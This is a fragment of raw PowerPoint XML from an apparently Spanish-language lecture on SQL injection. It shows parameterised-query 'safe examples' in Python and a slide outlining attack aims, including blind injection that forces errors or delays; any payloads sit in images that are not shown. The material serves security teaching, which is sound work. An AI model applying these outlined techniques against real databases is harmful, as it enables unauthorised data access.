          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2971222" y="1234002"/>
            <a:ext cx="8983329" cy="1419423"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Imagen 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0E098E8-6FE2-17DF-EBAB-1CAF1532DC0C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3001392" y="3234455"/>
            <a:ext cx="8983329" cy="1556744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Rectangle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7B75535E-D2C7-DBEA-95BF-191D08897943}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2963684" y="5372229"/>
            <a:ext cx="9134046" cy="907941"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F6F6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Aft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="8F5902"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t># SAFE EXAMPLES. DO THIS!</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="212529"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>cursor</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="CE5C00"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>execute</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="4E9A06"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="4E9A06"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>SELECT admin FROM users WHERE username = </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="1B6700"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>%s</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="4E9A06"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>'"</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="212529"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>username</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="212529"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>));</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="SFMono-Regular"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>cursor</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="CE5C00"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>execute</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="4E9A06"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>"SELECT admin FROM users WHERE username = </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="1B6700"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>%(username)s</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="4E9A06"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="212529"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="4E9A06"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>'username'</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="212529"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>username</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="SFMono-Regular"/>
              </a:rPr>
              <a:t>});</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-ES" altLang="es-ES" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="es-ES" altLang="es-E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30845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ítulo 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1671070" y="2492067"/>
            <a:ext cx="8208838" cy="936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 altLang="es-ES" sz="5000" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Inyección SQL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="265106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290284" y="137715"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Inyección SQL: ataque</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="127422" y="816657"/>
            <a:ext cx="9343950" cy="55464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514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Recuperar datos ocultos</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Modificar lógica</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Recuperar datos otras tablas</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Ciega</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>: no se espera un resultado</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Provocando error</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1657350" lvl="2" indent="-457200"/>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>La división por cero daría un error</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Provocando retraso en la consulta</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Imagen 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FEA149DB-B636-0E65-DC2F-AA2EAB71540C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4399365" y="907468"/>
            <a:ext cx="6268325" cy="504895"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Imagen 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{84675678-DBD2-328B-B7E6-55A214485205}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3302781" y="1452607"/>
            <a:ext cx="6477904" cy="409632"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Imagen 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B17EFE19-66D5-20D2-1066-07B34B96A8B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5053590" y="1894201"/>
            <a:ext cx="4553585" cy="400106"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Imagen 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{67EB66E2-32A8-4816-24E7-3E4071E420D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5771538" y="2394494"/>
            <a:ext cx="5365086" cy="2293200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2AAD2B12-F3E2-1E4E-48B6-980791FD4294}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3924897" y="4857948"/>
            <a:ext cx="8211696" cy="362001"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Imagen 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A96A228-AE14-7B36-F0B7-EE1F6CA8DD2D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId9"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5956933" y="5605757"/>
            <a:ext cx="5153744" cy="371527"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="959203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290284" y="137715"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
